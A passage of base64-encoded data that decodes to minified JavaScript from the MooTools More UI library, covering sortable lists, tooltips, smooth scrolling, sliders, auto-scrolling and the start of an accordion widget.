lbnRzPVtdO3RoaXMubGlzdHM9W107dGhpcy5pZGxlPXRydWU7dGhpcy5hZGRMaXN0cygkJCgkKEEpfHxBKSk7aWYoIXRoaXMub3B0aW9ucy5jbG9uZSl7dGhpcy5vcHRpb25zLnJldmVydD1mYWxzZTt9aWYodGhpcy5vcHRpb25zLnJldmVydCl7dGhpcy5lZmZlY3Q9bmV3IEZ4Lk1vcnBoKG51bGwsJG1lcmdlKHtkdXJhdGlvbjoyNTAsbGluazoiY2FuY2VsIn0sdGhpcy5vcHRpb25zLnJldmVydCkpOwp9fSxhdHRhY2g6ZnVuY3Rpb24oKXt0aGlzLmFkZExpc3RzKHRoaXMubGlzdHMpO3JldHVybiB0aGlzO30sZGV0YWNoOmZ1bmN0aW9uKCl7dGhpcy5saXN0cz10aGlzLnJlbW92ZUxpc3RzKHRoaXMubGlzdHMpO3JldHVybiB0aGlzO30sYWRkSXRlbXM6ZnVuY3Rpb24oKXtBcnJheS5mbGF0dGVuKGFyZ3VtZW50cykuZWFjaChmdW5jdGlvbihBKXt0aGlzLmVsZW1lbnRzLnB1c2goQSk7CnZhciBCPUEucmV0cmlldmUoInNvcnRhYmxlczpzdGFydCIsdGhpcy5zdGFydC5iaW5kV2l0aEV2ZW50KHRoaXMsQSkpOyh0aGlzLm9wdGlvbnMuaGFuZGxlP0EuZ2V0RWxlbWVudCh0aGlzLm9wdGlvbnMuaGFuZGxlKXx8QTpBKS5hZGRFdmVudCgibW91c2Vkb3duIixCKTsKfSx0aGlzKTtyZXR1cm4gdGhpczt9LGFkZExpc3RzOmZ1bmN0aW9uKCl7QXJyYXkuZmxhdHRlbihhcmd1bWVudHMpLmVhY2goZnVuY3Rpb24oQSl7dGhpcy5saXN0cy5wdXNoKEEpO3RoaXMuYWRkSXRlbXMoQS5nZXRDaGlsZHJlbigpKTt9LHRoaXMpO3JldHVybiB0aGlzOwp9LHJlbW92ZUl0ZW1zOmZ1bmN0aW9uKCl7dmFyIEE9W107QXJyYXkuZmxhdHRlbihhcmd1bWVudHMpLmVhY2goZnVuY3Rpb24oQil7QS5wdXNoKEIpO3RoaXMuZWxlbWVudHMuZXJhc2UoQik7dmFyIEM9Qi5yZXRyaWV2ZSgic29ydGFibGVzOnN0YXJ0Iik7KHRoaXMub3B0aW9ucy5oYW5kbGU/Qi5nZXRFbGVtZW50KHRoaXMub3B0aW9ucy5oYW5kbGUpfHxCOkIpLnJlbW92ZUV2ZW50KCJtb3VzZWRvd24iLEMpOwp9LHRoaXMpO3JldHVybiAkJChBKTt9LHJlbW92ZUxpc3RzOmZ1bmN0aW9uKCl7dmFyIEE9W107QXJyYXkuZmxhdHRlbihhcmd1bWVudHMpLmVhY2goZnVuY3Rpb24oQil7QS5wdXNoKEIpO3RoaXMubGlzdHMuZXJhc2UoQik7dGhpcy5yZW1vdmVJdGVtcyhCLmdldENoaWxkcmVuKCkpOwp9LHRoaXMpO3JldHVybiAkJChBKTt9LGdldENsb25lOmZ1bmN0aW9uKEIsQSl7aWYoIXRoaXMub3B0aW9ucy5jbG9uZSl7cmV0dXJuIG5ldyBFbGVtZW50KCJkaXYiKS5pbmplY3QoZG9jdW1lbnQuYm9keSk7fWlmKCR0eXBlKHRoaXMub3B0aW9ucy5jbG9uZSk9PSJmdW5jdGlvbiIpe3JldHVybiB0aGlzLm9wdGlvbnMuY2xvbmUuY2FsbCh0aGlzLEIsQSx0aGlzLmxpc3QpOwp9cmV0dXJuIEEuY2xvbmUodHJ1ZSkuc2V0U3R5bGVzKHttYXJnaW46IjBweCIscG9zaXRpb246ImFic29sdXRlIix2aXNpYmlsaXR5OiJoaWRkZW4iLHdpZHRoOkEuZ2V0U3R5bGUoIndpZHRoIil9KS5pbmplY3QodGhpcy5saXN0KS5wb3NpdGlvbihBLmdldFBvc2l0aW9uKEEuZ2V0T2Zmc2V0UGFyZW50KCkpKTsKfSxnZXREcm9wcGFibGVzOmZ1bmN0aW9uKCl7dmFyIEE9dGhpcy5saXN0LmdldENoaWxkcmVuKCk7aWYoIXRoaXMub3B0aW9ucy5jb25zdHJhaW4pe0E9dGhpcy5saXN0cy5jb25jYXQoQSkuZXJhc2UodGhpcy5saXN0KTt9cmV0dXJuIEEuZXJhc2UodGhpcy5jbG9uZSkuZXJhc2UodGhpcy5lbGVtZW50KTsKfSxpbnNlcnQ6ZnVuY3Rpb24oQyxCKXt2YXIgQT0iaW5zaWRlIjtpZih0aGlzLmxpc3RzLmNvbnRhaW5zKEIpKXt0aGlzLmxpc3Q9Qjt0aGlzLmRyYWcuZHJvcHBhYmxlcz10aGlzLmdldERyb3BwYWJsZXMoKTt9ZWxzZXtBPXRoaXMuZWxlbWVudC5nZXRBbGxQcmV2aW91cygpLmNvbnRhaW5zKEIpPyJiZWZvcmUiOiJhZnRlciI7Cn10aGlzLmVsZW1lbnQuaW5qZWN0KEIsQSk7dGhpcy5maXJlRXZlbnQoInNvcnQiLFt0aGlzLmVsZW1lbnQsdGhpcy5jbG9uZV0pO30sc3RhcnQ6ZnVuY3Rpb24oQixBKXtpZighdGhpcy5pZGxlKXtyZXR1cm4gO310aGlzLmlkbGU9ZmFsc2U7dGhpcy5lbGVtZW50PUE7CnRoaXMub3BhY2l0eT1BLmdldCgib3BhY2l0eSIpO3RoaXMubGlzdD1BLmdldFBhcmVudCgpO3RoaXMuY2xvbmU9dGhpcy5nZXRDbG9uZShCLEEpO3RoaXMuZHJhZz1uZXcgRHJhZy5Nb3ZlKHRoaXMuY2xvbmUse3NuYXA6dGhpcy5vcHRpb25zLnNuYXAsY29udGFpbmVyOnRoaXMub3B0aW9ucy5jb25zdHJhaW4mJnRoaXMuZWxlbWVudC5nZXRQYXJlbnQoKSxkcm9wcGFibGVzOnRoaXMuZ2V0RHJvcHBhYmxlcygpLG9uU25hcDpmdW5jdGlvbigpe0Iuc3RvcCgpOwp0aGlzLmNsb25lLnNldFN0eWxlKCJ2aXNpYmlsaXR5IiwidmlzaWJsZSIpO3RoaXMuZWxlbWVudC5zZXQoIm9wYWNpdHkiLHRoaXMub3B0aW9ucy5vcGFjaXR5fHwwKTt0aGlzLmZpcmVFdmVudCgic3RhcnQiLFt0aGlzLmVsZW1lbnQsdGhpcy5jbG9uZV0pO30uYmluZCh0aGlzKSxvbkVudGVyOnRoaXMuaW5zZXJ0LmJpbmQodGhpcyksb25DYW5jZWw6dGhpcy5yZXNldC5iaW5kKHRoaXMpLG9uQ29tcGxldGU6dGhpcy5lbmQuYmluZCh0aGlzKX0pOwp0aGlzLmNsb25lLmluamVjdCh0aGlzLmVsZW1lbnQsImJlZm9yZSIpO3RoaXMuZHJhZy5zdGFydChCKTt9LGVuZDpmdW5jdGlvbigpe3RoaXMuZHJhZy5kZXRhY2goKTt0aGlzLmVsZW1lbnQuc2V0KCJvcGFjaXR5Iix0aGlzLm9wYWNpdHkpO2lmKHRoaXMuZWZmZWN0KXt2YXIgQT10aGlzLmVsZW1lbnQuZ2V0U3R5bGVzKCJ3aWR0aCIsImhlaWdodCIpOwp2YXIgQj10aGlzLmNsb25lLmNvbXB1dGVQb3NpdGlvbih0aGlzLmVsZW1lbnQuZ2V0UG9zaXRpb24odGhpcy5jbG9uZS5vZmZzZXRQYXJlbnQpKTt0aGlzLmVmZmVjdC5lbGVtZW50PXRoaXMuY2xvbmU7dGhpcy5lZmZlY3Quc3RhcnQoe3RvcDpCLnRvcCxsZWZ0OkIubGVmdCx3aWR0aDpBLndpZHRoLGhlaWdodDpBLmhlaWdodCxvcGFjaXR5OjAuMjV9KS5jaGFpbih0aGlzLnJlc2V0LmJpbmQodGhpcykpOwp9ZWxzZXt0aGlzLnJlc2V0KCk7fX0scmVzZXQ6ZnVuY3Rpb24oKXt0aGlzLmlkbGU9dHJ1ZTt0aGlzLmNsb25lLmRlc3Ryb3koKTt0aGlzLmZpcmVFdmVudCgiY29tcGxldGUiLHRoaXMuZWxlbWVudCk7fSxzZXJpYWxpemU6ZnVuY3Rpb24oKXt2YXIgQz1BcnJheS5saW5rKGFyZ3VtZW50cyx7bW9kaWZpZXI6RnVuY3Rpb24udHlwZSxpbmRleDokZGVmaW5lZH0pOwp2YXIgQj10aGlzLmxpc3RzLm1hcChmdW5jdGlvbihEKXtyZXR1cm4gRC5nZXRDaGlsZHJlbigpLm1hcChDLm1vZGlmaWVyfHxmdW5jdGlvbihFKXtyZXR1cm4gRS5nZXQoImlkIik7fSx0aGlzKTt9LHRoaXMpO3ZhciBBPUMuaW5kZXg7aWYodGhpcy5saXN0cy5sZW5ndGg9PTEpe0E9MDsKfXJldHVybiAkY2hrKEEpJiZBPj0wJiZBPHRoaXMubGlzdHMubGVuZ3RoP0JbQV06Qjt9fSk7dmFyIFRpcHM9bmV3IENsYXNzKHtJbXBsZW1lbnRzOltFdmVudHMsT3B0aW9uc10sb3B0aW9uczp7b25TaG93OmZ1bmN0aW9uKEEpe0Euc2V0U3R5bGUoInZpc2liaWxpdHkiLCJ2aXNpYmxlIik7Cn0sb25IaWRlOmZ1bmN0aW9uKEEpe0Euc2V0U3R5bGUoInZpc2liaWxpdHkiLCJoaWRkZW4iKTt9LHNob3dEZWxheToxMDAsaGlkZURlbGF5OjEwMCxjbGFzc05hbWU6bnVsbCxvZmZzZXRzOnt4OjE2LHk6MTZ9LGZpeGVkOmZhbHNlfSxpbml0aWFsaXplOmZ1bmN0aW9uKCl7dmFyIEM9QXJyYXkubGluayhhcmd1bWVudHMse29wdGlvbnM6T2JqZWN0LnR5cGUsZWxlbWVudHM6JGRlZmluZWR9KTsKdGhpcy5zZXRPcHRpb25zKEMub3B0aW9uc3x8bnVsbCk7dGhpcy50aXA9bmV3IEVsZW1lbnQoImRpdiIpLmluamVjdChkb2N1bWVudC5ib2R5KTtpZih0aGlzLm9wdGlvbnMuY2xhc3NOYW1lKXt0aGlzLnRpcC5hZGRDbGFzcyh0aGlzLm9wdGlvbnMuY2xhc3NOYW1lKTsKfXZhciBCPW5ldyBFbGVtZW50KCJkaXYiLHsiY2xhc3MiOiJ0aXAtdG9wIn0pLmluamVjdCh0aGlzLnRpcCk7dGhpcy5jb250YWluZXI9bmV3IEVsZW1lbnQoImRpdiIseyJjbGFzcyI6InRpcCJ9KS5pbmplY3QodGhpcy50aXApO3ZhciBBPW5ldyBFbGVtZW50KCJkaXYiLHsiY2xhc3MiOiJ0aXAtYm90dG9tIn0pLmluamVjdCh0aGlzLnRpcCk7CnRoaXMudGlwLnNldFN0eWxlcyh7cG9zaXRpb246ImFic29sdXRlIix0b3A6MCxsZWZ0OjAsdmlzaWJpbGl0eToiaGlkZGVuIn0pO2lmKEMuZWxlbWVudHMpe3RoaXMuYXR0YWNoKEMuZWxlbWVudHMpO319LGF0dGFjaDpmdW5jdGlvbihBKXskJChBKS5lYWNoKGZ1bmN0aW9uKEQpe3ZhciBHPUQucmV0cmlldmUoInRpcDp0aXRsZSIsRC5nZXQoInRpdGxlIikpOwp2YXIgRj1ELnJldHJpZXZlKCJ0aXA6dGV4dCIsRC5nZXQoInJlbCIpfHxELmdldCgiaHJlZiIpKTt2YXIgRT1ELnJldHJpZXZlKCJ0aXA6ZW50ZXIiLHRoaXMuZWxlbWVudEVudGVyLmJpbmRXaXRoRXZlbnQodGhpcyxEKSk7dmFyIEM9RC5yZXRyaWV2ZSgidGlwOmxlYXZlIix0aGlzLmVsZW1lbnRMZWF2ZS5iaW5kV2l0aEV2ZW50KHRoaXMsRCkpOwpELmFkZEV2ZW50cyh7bW91c2VlbnRlcjpFLG1vdXNlbGVhdmU6Q30pO2lmKCF0aGlzLm9wdGlvbnMuZml4ZWQpe3ZhciBCPUQucmV0cmlldmUoInRpcDptb3ZlIix0aGlzLmVsZW1lbnRNb3ZlLmJpbmRXaXRoRXZlbnQodGhpcyxEKSk7RC5hZGRFdmVudCgibW91c2Vtb3ZlIixCKTsKfUQuc3RvcmUoInRpcDpuYXRpdmUiLEQuZ2V0KCJ0aXRsZSIpKTtELmVyYXNlKCJ0aXRsZSIpO30sdGhpcyk7cmV0dXJuIHRoaXM7fSxkZXRhY2g6ZnVuY3Rpb24oQSl7JCQoQSkuZWFjaChmdW5jdGlvbihDKXtDLnJlbW92ZUV2ZW50KCJtb3VzZWVudGVyIixDLnJldHJpZXZlKCJ0aXA6ZW50ZXIiKXx8JGVtcHR5KTsKQy5yZW1vdmVFdmVudCgibW91c2VsZWF2ZSIsQy5yZXRyaWV2ZSgidGlwOmxlYXZlIil8fCRlbXB0eSk7Qy5yZW1vdmVFdmVudCgibW91c2Vtb3ZlIixDLnJldHJpZXZlKCJ0aXA6bW92ZSIpfHwkZW1wdHkpO0MuZWxpbWluYXRlKCJ0aXA6ZW50ZXIiKS5lbGltaW5hdGUoInRpcDpsZWF2ZSIpLmVsaW1pbmF0ZSgidGlwOm1vdmUiKTsKdmFyIEI9Qy5yZXRyaWV2ZSgidGlwOm5hdGl2ZSIpO2lmKEIpe0Muc2V0KCJ0aXRsZSIsQik7fX0pO3JldHVybiB0aGlzO30sZWxlbWVudEVudGVyOmZ1bmN0aW9uKEIsQSl7JEEodGhpcy5jb250YWluZXIuY2hpbGROb2RlcykuZWFjaChFbGVtZW50LmRpc3Bvc2UpOwp2YXIgRD1BLnJldHJpZXZlKCJ0aXA6dGl0bGUiKTtpZihEKXt0aGlzLnRpdGxlRWxlbWVudD1uZXcgRWxlbWVudCgiZGl2Iix7ImNsYXNzIjoidGlwLXRpdGxlIn0pLmluamVjdCh0aGlzLmNvbnRhaW5lcik7dGhpcy5maWxsKHRoaXMudGl0bGVFbGVtZW50LEQpO312YXIgQz1BLnJldHJpZXZlKCJ0aXA6dGV4dCIpOwppZihDKXt0aGlzLnRleHRFbGVtZW50PW5ldyBFbGVtZW50KCJkaXYiLHsiY2xhc3MiOiJ0aXAtdGV4dCJ9KS5pbmplY3QodGhpcy5jb250YWluZXIpO3RoaXMuZmlsbCh0aGlzLnRleHRFbGVtZW50LEMpO310aGlzLnRpbWVyPSRjbGVhcih0aGlzLnRpbWVyKTt0aGlzLnRpbWVyPXRoaXMuc2hvdy5kZWxheSh0aGlzLm9wdGlvbnMuc2hvd0RlbGF5LHRoaXMpOwp0aGlzLnBvc2l0aW9uKCghdGhpcy5vcHRpb25zLmZpeGVkKT9COntwYWdlOkEuZ2V0UG9zaXRpb24oKX0pO30sZWxlbWVudExlYXZlOmZ1bmN0aW9uKEEpeyRjbGVhcih0aGlzLnRpbWVyKTt0aGlzLnRpbWVyPXRoaXMuaGlkZS5kZWxheSh0aGlzLm9wdGlvbnMuaGlkZURlbGF5LHRoaXMpOwp9LGVsZW1lbnRNb3ZlOmZ1bmN0aW9uKEEpe3RoaXMucG9zaXRpb24oQSk7fSxwb3NpdGlvbjpmdW5jdGlvbihEKXt2YXIgQj13aW5kb3cuZ2V0U2l6ZSgpLEE9d2luZG93LmdldFNjcm9sbCgpO3ZhciBFPXt4OnRoaXMudGlwLm9mZnNldFdpZHRoLHk6dGhpcy50aXAub2Zmc2V0SGVpZ2h0fTsKdmFyIEM9e3g6ImxlZnQiLHk6InRvcCJ9O2Zvcih2YXIgRiBpbiBDKXt2YXIgRz1ELnBhZ2VbRl0rdGhpcy5vcHRpb25zLm9mZnNldHNbRl07aWYoKEcrRVtGXS1BW0ZdKT5CW0ZdKXtHPUQucGFnZVtGXS10aGlzLm9wdGlvbnMub2Zmc2V0c1tGXS1FW0ZdO310aGlzLnRpcC5zZXRTdHlsZShDW0ZdLEcpOwp9fSxmaWxsOmZ1bmN0aW9uKEEsQil7KHR5cGVvZiBCPT0ic3RyaW5nIik/QS5zZXQoImh0bWwiLEIpOkEuYWRvcHQoQik7fSxzaG93OmZ1bmN0aW9uKCl7dGhpcy5maXJlRXZlbnQoInNob3ciLHRoaXMudGlwKTt9LGhpZGU6ZnVuY3Rpb24oKXt0aGlzLmZpcmVFdmVudCgiaGlkZSIsdGhpcy50aXApOwp9fSk7dmFyIFNtb290aFNjcm9sbD1uZXcgQ2xhc3Moe0V4dGVuZHM6RnguU2Nyb2xsLGluaXRpYWxpemU6ZnVuY3Rpb24oQixDKXtDPUN8fGRvY3VtZW50O3ZhciBFPUMuZ2V0RG9jdW1lbnQoKSxEPUMuZ2V0V2luZG93KCk7dGhpcy5wYXJlbnQoRSxCKTt0aGlzLmxpbmtzPSh0aGlzLm9wdGlvbnMubGlua3MpPyQkKHRoaXMub3B0aW9ucy5saW5rcyk6JCQoRS5saW5rcyk7CnZhciBBPUQubG9jYXRpb24uaHJlZi5tYXRjaCgvXlteI10qLylbMF0rIiMiO3RoaXMubGlua3MuZWFjaChmdW5jdGlvbihHKXtpZihHLmhyZWYuaW5kZXhPZihBKSE9MCl7cmV0dXJuIDt9dmFyIEY9Ry5ocmVmLnN1YnN0cihBLmxlbmd0aCk7aWYoRiYmJChGKSl7dGhpcy51c2VMaW5rKEcsRik7Cn19LHRoaXMpO2lmKCFCcm93c2VyLkVuZ2luZS53ZWJraXQ0MTkpe3RoaXMuYWRkRXZlbnQoImNvbXBsZXRlIixmdW5jdGlvbigpe0QubG9jYXRpb24uaGFzaD10aGlzLmFuY2hvcjt9LHRydWUpO319LHVzZUxpbms6ZnVuY3Rpb24oQixBKXtCLmFkZEV2ZW50KCJjbGljayIsZnVuY3Rpb24oQyl7dGhpcy5hbmNob3I9QTsKdGhpcy50b0VsZW1lbnQoQSk7Qy5zdG9wKCk7fS5iaW5kKHRoaXMpKTt9fSk7dmFyIFNsaWRlcj1uZXcgQ2xhc3Moe0ltcGxlbWVudHM6W0V2ZW50cyxPcHRpb25zXSxvcHRpb25zOntvblRpY2s6ZnVuY3Rpb24oQSl7aWYodGhpcy5vcHRpb25zLnNuYXApe0E9dGhpcy50b1Bvc2l0aW9uKHRoaXMuc3RlcCk7Cn10aGlzLmtub2Iuc2V0U3R5bGUodGhpcy5wcm9wZXJ0eSxBKTt9LHNuYXA6ZmFsc2Usb2Zmc2V0OjAscmFuZ2U6ZmFsc2Usd2hlZWw6ZmFsc2Usc3RlcHM6MTAwLG1vZGU6Imhvcml6b250YWwifSxpbml0aWFsaXplOmZ1bmN0aW9uKEUsQSxEKXt0aGlzLnNldE9wdGlvbnMoRCk7CnRoaXMuZWxlbWVudD0kKEUpO3RoaXMua25vYj0kKEEpO3RoaXMucHJldmlvdXNDaGFuZ2U9dGhpcy5wcmV2aW91c0VuZD10aGlzLnN0ZXA9LTE7dGhpcy5lbGVtZW50LmFkZEV2ZW50KCJtb3VzZWRvd24iLHRoaXMuY2xpY2tlZEVsZW1lbnQuYmluZCh0aGlzKSk7aWYodGhpcy5vcHRpb25zLndoZWVsKXt0aGlzLmVsZW1lbnQuYWRkRXZlbnQoIm1vdXNld2hlZWwiLHRoaXMuc2Nyb2xsZWRFbGVtZW50LmJpbmRXaXRoRXZlbnQodGhpcykpOwp9dmFyIEYsQj17fSxDPXt4OmZhbHNlLHk6ZmFsc2V9O3N3aXRjaCh0aGlzLm9wdGlvbnMubW9kZSl7Y2FzZSJ2ZXJ0aWNhbCI6dGhpcy5heGlzPSJ5Ijt0aGlzLnByb3BlcnR5PSJ0b3AiO0Y9Im9mZnNldEhlaWdodCI7YnJlYWs7Y2FzZSJob3Jpem9udGFsIjp0aGlzLmF4aXM9IngiOwp0aGlzLnByb3BlcnR5PSJsZWZ0IjtGPSJvZmZzZXRXaWR0aCI7fXRoaXMuaGFsZj10aGlzLmtub2JbRl0vMjt0aGlzLmZ1bGw9dGhpcy5lbGVtZW50W0ZdLXRoaXMua25vYltGXSsodGhpcy5vcHRpb25zLm9mZnNldCoyKTt0aGlzLm1pbj0kY2hrKHRoaXMub3B0aW9ucy5yYW5nZVswXSk/dGhpcy5vcHRpb25zLnJhbmdlWzBdOjA7CnRoaXMubWF4PSRjaGsodGhpcy5vcHRpb25zLnJhbmdlWzFdKT90aGlzLm9wdGlvbnMucmFuZ2VbMV06dGhpcy5vcHRpb25zLnN0ZXBzO3RoaXMucmFuZ2U9dGhpcy5tYXgtdGhpcy5taW47dGhpcy5zdGVwcz10aGlzLm9wdGlvbnMuc3RlcHN8fHRoaXMuZnVsbDt0aGlzLnN0ZXBTaXplPU1hdGguYWJzKHRoaXMucmFuZ2UpL3RoaXMuc3RlcHM7CnRoaXMuc3RlcFdpZHRoPXRoaXMuc3RlcFNpemUqdGhpcy5mdWxsL01hdGguYWJzKHRoaXMucmFuZ2UpO3RoaXMua25vYi5zZXRTdHlsZSgicG9zaXRpb24iLCJyZWxhdGl2ZSIpLnNldFN0eWxlKHRoaXMucHJvcGVydHksLXRoaXMub3B0aW9ucy5vZmZzZXQpO0NbdGhpcy5heGlzXT10aGlzLnByb3BlcnR5OwpCW3RoaXMuYXhpc109Wy10aGlzLm9wdGlvbnMub2Zmc2V0LHRoaXMuZnVsbC10aGlzLm9wdGlvbnMub2Zmc2V0XTt0aGlzLmRyYWc9bmV3IERyYWcodGhpcy5rbm9iLHtzbmFwOjAsbGltaXQ6Qixtb2RpZmllcnM6QyxvbkRyYWc6dGhpcy5kcmFnZ2VkS25vYi5iaW5kKHRoaXMpLG9uU3RhcnQ6dGhpcy5kcmFnZ2VkS25vYi5iaW5kKHRoaXMpLG9uQ29tcGxldGU6ZnVuY3Rpb24oKXt0aGlzLmRyYWdnZWRLbm9iKCk7CnRoaXMuZW5kKCk7fS5iaW5kKHRoaXMpfSk7aWYodGhpcy5vcHRpb25zLnNuYXApe3RoaXMuZHJhZy5vcHRpb25zLmdyaWQ9TWF0aC5jZWlsKHRoaXMuc3RlcFdpZHRoKTt0aGlzLmRyYWcub3B0aW9ucy5saW1pdFt0aGlzLmF4aXNdWzFdPXRoaXMuZnVsbDt9fSxzZXQ6ZnVuY3Rpb24oQSl7aWYoISgodGhpcy5yYW5nZT4wKV4oQTx0aGlzLm1pbikpKXtBPXRoaXMubWluOwp9aWYoISgodGhpcy5yYW5nZT4wKV4oQT50aGlzLm1heCkpKXtBPXRoaXMubWF4O310aGlzLnN0ZXA9TWF0aC5yb3VuZChBKTt0aGlzLmNoZWNrU3RlcCgpO3RoaXMuZW5kKCk7dGhpcy5maXJlRXZlbnQoInRpY2siLHRoaXMudG9Qb3NpdGlvbih0aGlzLnN0ZXApKTtyZXR1cm4gdGhpczsKfSxjbGlja2VkRWxlbWVudDpmdW5jdGlvbihDKXt2YXIgQj10aGlzLnJhbmdlPDA/LTE6MTt2YXIgQT1DLnBhZ2VbdGhpcy5heGlzXS10aGlzLmVsZW1lbnQuZ2V0UG9zaXRpb24oKVt0aGlzLmF4aXNdLXRoaXMuaGFsZjtBPUEubGltaXQoLXRoaXMub3B0aW9ucy5vZmZzZXQsdGhpcy5mdWxsLXRoaXMub3B0aW9ucy5vZmZzZXQpOwp0aGlzLnN0ZXA9TWF0aC5yb3VuZCh0aGlzLm1pbitCKnRoaXMudG9TdGVwKEEpKTt0aGlzLmNoZWNrU3RlcCgpO3RoaXMuZW5kKCk7dGhpcy5maXJlRXZlbnQoInRpY2siLEEpO30sc2Nyb2xsZWRFbGVtZW50OmZ1bmN0aW9uKEEpe3ZhciBCPSh0aGlzLm9wdGlvbnMubW9kZT09Imhvcml6b250YWwiKT8oQS53aGVlbDwwKTooQS53aGVlbD4wKTsKdGhpcy5zZXQoQj90aGlzLnN0ZXAtdGhpcy5zdGVwU2l6ZTp0aGlzLnN0ZXArdGhpcy5zdGVwU2l6ZSk7QS5zdG9wKCk7fSxkcmFnZ2VkS25vYjpmdW5jdGlvbigpe3ZhciBCPXRoaXMucmFuZ2U8MD8tMToxO3ZhciBBPXRoaXMuZHJhZy52YWx1ZS5ub3dbdGhpcy5heGlzXTsKQT1BLmxpbWl0KC10aGlzLm9wdGlvbnMub2Zmc2V0LHRoaXMuZnVsbC10aGlzLm9wdGlvbnMub2Zmc2V0KTt0aGlzLnN0ZXA9TWF0aC5yb3VuZCh0aGlzLm1pbitCKnRoaXMudG9TdGVwKEEpKTt0aGlzLmNoZWNrU3RlcCgpO30sY2hlY2tTdGVwOmZ1bmN0aW9uKCl7aWYodGhpcy5wcmV2aW91c0NoYW5nZSE9dGhpcy5zdGVwKXt0aGlzLnByZXZpb3VzQ2hhbmdlPXRoaXMuc3RlcDsKdGhpcy5maXJlRXZlbnQoImNoYW5nZSIsdGhpcy5zdGVwKTt9fSxlbmQ6ZnVuY3Rpb24oKXtpZih0aGlzLnByZXZpb3VzRW5kIT09dGhpcy5zdGVwKXt0aGlzLnByZXZpb3VzRW5kPXRoaXMuc3RlcDt0aGlzLmZpcmVFdmVudCgiY29tcGxldGUiLHRoaXMuc3RlcCsiIik7Cn19LHRvU3RlcDpmdW5jdGlvbihBKXt2YXIgQj0oQSt0aGlzLm9wdGlvbnMub2Zmc2V0KSp0aGlzLnN0ZXBTaXplL3RoaXMuZnVsbCp0aGlzLnN0ZXBzO3JldHVybiB0aGlzLm9wdGlvbnMuc3RlcHM/TWF0aC5yb3VuZChCLT1CJXRoaXMuc3RlcFNpemUpOkI7fSx0b1Bvc2l0aW9uOmZ1bmN0aW9uKEEpe3JldHVybih0aGlzLmZ1bGwqTWF0aC5hYnModGhpcy5taW4tQSkpLyh0aGlzLnN0ZXBzKnRoaXMuc3RlcFNpemUpLXRoaXMub3B0aW9ucy5vZmZzZXQ7Cn19KTt2YXIgU2Nyb2xsZXI9bmV3IENsYXNzKHtJbXBsZW1lbnRzOltFdmVudHMsT3B0aW9uc10sb3B0aW9uczp7YXJlYToyMCx2ZWxvY2l0eToxLG9uQ2hhbmdlOmZ1bmN0aW9uKEEsQil7dGhpcy5lbGVtZW50LnNjcm9sbFRvKEEsQik7fX0saW5pdGlhbGl6ZTpmdW5jdGlvbihCLEEpe3RoaXMuc2V0T3B0aW9ucyhBKTsKdGhpcy5lbGVtZW50PSQoQik7dGhpcy5saXN0ZW5lcj0oJHR5cGUodGhpcy5lbGVtZW50KSE9ImVsZW1lbnQiKT8kKHRoaXMuZWxlbWVudC5nZXREb2N1bWVudCgpLmJvZHkpOnRoaXMuZWxlbWVudDt0aGlzLnRpbWVyPW51bGw7dGhpcy5jb29yZD10aGlzLmdldENvb3Jkcy5iaW5kKHRoaXMpOwp9LHN0YXJ0OmZ1bmN0aW9uKCl7dGhpcy5saXN0ZW5lci5hZGRFdmVudCgibW91c2Vtb3ZlIix0aGlzLmNvb3JkKTt9LHN0b3A6ZnVuY3Rpb24oKXt0aGlzLmxpc3RlbmVyLnJlbW92ZUV2ZW50KCJtb3VzZW1vdmUiLHRoaXMuY29vcmQpO3RoaXMudGltZXI9JGNsZWFyKHRoaXMudGltZXIpOwp9LGdldENvb3JkczpmdW5jdGlvbihBKXt0aGlzLnBhZ2U9KHRoaXMubGlzdGVuZXIuZ2V0KCJ0YWciKT09ImJvZHkiKT9BLmNsaWVudDpBLnBhZ2U7aWYoIXRoaXMudGltZXIpe3RoaXMudGltZXI9dGhpcy5zY3JvbGwucGVyaW9kaWNhbCg1MCx0aGlzKTt9fSxzY3JvbGw6ZnVuY3Rpb24oKXt2YXIgQj10aGlzLmVsZW1lbnQuZ2V0U2l6ZSgpLEE9dGhpcy5lbGVtZW50LmdldFNjcm9sbCgpLEU9dGhpcy5lbGVtZW50LmdldFBvc2l0aW9uKCksRD17eDowLHk6MH07CmZvcih2YXIgQyBpbiB0aGlzLnBhZ2Upe2lmKHRoaXMucGFnZVtDXTwodGhpcy5vcHRpb25zLmFyZWErRVtDXSkmJkFbQ10hPTApe0RbQ109KHRoaXMucGFnZVtDXS10aGlzLm9wdGlvbnMuYXJlYS1FW0NdKSp0aGlzLm9wdGlvbnMudmVsb2NpdHk7fWVsc2V7aWYodGhpcy5wYWdlW0NdK3RoaXMub3B0aW9ucy5hcmVhPihCW0NdK0VbQ10pJiZCW0NdK0JbQ10hPUFbQ10pe0RbQ109KHRoaXMucGFnZVtDXS1CW0NdK3RoaXMub3B0aW9ucy5hcmVhLUVbQ10pKnRoaXMub3B0aW9ucy52ZWxvY2l0eTsKfX19aWYoRC55fHxELngpe3RoaXMuZmlyZUV2ZW50KCJjaGFuZ2UiLFtBLngrRC54LEEueStELnldKTt9fX0pO3ZhciBBY2NvcmRpb249bmV3IENsYXNzKHtFeHRlbmRzOkZ4LkVsZW1lbnRzLG9wdGlvbnM6e2Rpc3BsYXk6MCxzaG93OmZhbHNlLGhlaWdodDp0cnVlLHdpZHRoOmZhbHNlLG9wYWNpdHk6dHJ1ZSxmaXhlZEhlaWdodDpmYWxzZSxmaXhlZFdpZHRoOmZhbHNlLHdhaXQ6ZmFsc2UsYWx3YXlzSGlkZTpmYWxzZX0saW5pdGlhbGl6ZTpmdW5jdGlvbigpe3ZhciBDPUFycmF5LmxpbmsoYXJndW1lbnRzLHtjb250YWluZXI6RWxlbWVudC50eXBlLG9wdGlvbnM6T2JqZWN0LnR5cGUsdG9nZ2xlcnM6JGRlZmluZWQsZWxlbWVudHM6JGRlZmluZWR9KTsKdGhpcy5wYXJlbnQoQy5lbGVtZW50cyxDLm9wdGlvbnMpO3RoaXMudG9nZ2xlcnM9JCQoQy50b2dnbGVycyk7dGhpcy5jb250YWluZXI9JChDLmNvbnRhaW5lcik7dGhpcy5wcmV2aW91cz0tMTtpZih0aGlzLm9wdGlvbnMuYWx3YXlzSGlkZSl7dGhpcy5vcHRpb25zLndhaXQ9dHJ1ZTsKfWlmKCRjaGsodGhpcy5vcHRpb25zLnNob3cpKXt0aGlzLm9wdGlvbnMuZGlzcGxheT1mYWxzZTt0aGlzLnByZXZpb3VzPXRoaXMub3B0aW9ucy5zaG93O31pZih0aGlzLm9wdGlvbnMuc3RhcnQpe3RoaXMub3B0aW9ucy5kaXNwbGF5PWZhbHNlO3RoaXMub3B0aW9ucy5zaG93PWZhbHNlOwp9dGhpcy5lZmZlY3RzPXt9O2lmKHRoaXMub3B0a